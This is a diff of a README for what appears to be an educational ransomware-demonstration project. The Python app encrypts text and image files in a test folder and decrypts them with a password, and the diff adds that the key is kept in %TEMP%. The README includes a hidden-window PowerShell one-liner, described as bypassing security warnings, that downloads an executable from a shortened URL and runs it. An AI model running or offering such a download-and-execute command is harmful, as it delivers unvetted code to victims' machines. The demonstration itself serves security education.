@@ -7,11 +7,11 @@
 
 ## What it is 
 
-Simple application made with python and tkinter to demonstrate how an application can encrypt and decrypt your files with extensions {'.txt', '.jpg', '.jpeg', '.png'} in the directory called TestDirz338
+Simple application made with python and tkinter to demonstrate how an application can encrypt and decrypt your files with extensions {'.txt', '.jpg', '.jpeg', '.png'} in the directory called TestDirz338. Encryption key is generated in users %TEMP% folder.
 
 If combined with the PowerShell script below, the application gets downloaded and executed in path `{USER}\TestDirz338\` 
 
-Right now the application decrypts all {'.txt', '.jpg', '.jpeg', '.png'} files when user gives up the right password (lihapulla).
+Right now the application decrypts all {'.txt', '.jpg', '.jpeg', '.png'} files with the encryption key located in the users %TEMP% folder when user gives up the right password (lihapulla). 
 
 ![270753154-8fb9e882-b990-48cd-add6-309dd09af3be](https://github.com/therealhalonen/PhishSticks/assets/112076418/bee3e9ec-499b-4a0e-af8b-fc5e2c04b4ea)
 
@@ -31,7 +31,7 @@ Make a folder called TestDirz338 in the path C:/Users/{USER}/
 ![2023-12-05_18-59](https://github.com/therealhalonen/PhishSticks/assets/112076418/6682c7df-debb-40ce-bba0-aea449f228f4)
 
 
-Bypass security warnings and download the file in users %TEMP folder % & execute the application instantly in TestDirz338 folder by typing the following code into Run (Win+R) on **Windows**:
+Bypass security warnings and download the file in users %TEMP% folder & execute the application instantly in TestDirz338 folder by typing the following code into Run (Win+R) on **Windows**:
 ```
 powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/28sb6pvc', \"$env:TEMP\decryptor.exe\");Start-Process \"$env:TEMP\decryptor.exe\" -WorkingDir \"$env:UserProfile\TestDirz338\""
 ```
